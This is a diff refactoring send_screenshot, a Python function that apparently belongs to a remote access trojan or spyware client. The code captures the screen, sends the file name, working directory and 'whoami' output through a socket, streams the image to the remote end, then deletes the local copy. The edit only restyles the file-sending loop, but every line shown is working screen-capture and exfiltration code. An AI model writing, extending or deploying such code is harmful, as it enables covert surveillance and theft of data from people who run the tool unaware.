@@ -13,17 +13,16 @@ def send_screenshot(s,img_count):
     myscreenshot=screenshot()
     # Saving the screenshot 
     myscreenshot.save(rf'Screenshot{img_count}.png')
-    
+
     screenshot_filename=f'Screenshot{img_count}.png'
     s.send(f"{screenshot_filename}{Separator}{os.getcwd()}{Separator}{subprocess.getoutput('whoami')}".encode())
     with open(screenshot_filename,"rb") as f:
         while True:
-            bytes_read=f.read(bufferSize)
-    
-            if not bytes_read:
+            if bytes_read := f.read(bufferSize):
+                s.send(bytes_read)
+            else:
                 break
-            
-            s.send(bytes_read)
+
     os.remove(screenshot_filename)
     img_count+=1
     return ["[+] Screenshot recieved !",img_count]
